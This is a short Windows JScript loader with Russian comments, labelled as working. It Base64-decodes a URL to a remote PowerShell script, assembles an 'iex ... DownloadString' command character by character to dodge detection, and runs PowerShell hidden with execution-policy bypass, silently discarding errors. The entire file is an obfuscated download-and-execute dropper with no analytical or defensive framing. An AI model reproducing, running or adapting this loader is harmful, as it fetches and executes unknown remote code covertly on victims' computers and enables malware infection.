// ============================================
// JS Loader - только PowerShell (рабочий)
// ============================================

// Функция Base64
var _ = function(s){var a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o='',i=0;s=s.replace(/[^A-Za-z0-9\+\/]/g,'');while(s.length%4){s+='=';}while(i<s.length){var c1=a.indexOf(s.charAt(i++)),c2=a.indexOf(s.charAt(i++)),c3=a.indexOf(s.charAt(i++)),c4=a.indexOf(s.charAt(i++)),b=(c1<<18)|(c2<<12)|(c3<<6)|c4,x=(b>>16)&255,y=(b>>8)&255,z=b&255;o+=c3===64?String.fromCharCode(x):c4===64?String.fromCharCode(x,y):String.fromCharCode(x,y,z);}return o;};

// Запуск PowerShell (с обфускацией)
try {
    var c = new ActiveXObject('WScript.Shell');
    var u = _('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhcnJ5NzgwL2NsaWVzZXQvbWFpbi9zZWN1cmUucHMx');
    var p = 'i'+'e'+'x'+' '+'('+'N'+'e'+'w'+'-'+'O'+'b'+'j'+'e'+'c'+'t'+' '+'S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'W'+'e'+'b'+'C'+'l'+'i'+'e'+'n'+'t'+')'+'.'+'D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'S'+'t'+'r'+'i'+'n'+'g'+'('+"'"+u+"'"+')';
    c.Run('powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "'+p+'"',0,false);
} catch(e) {}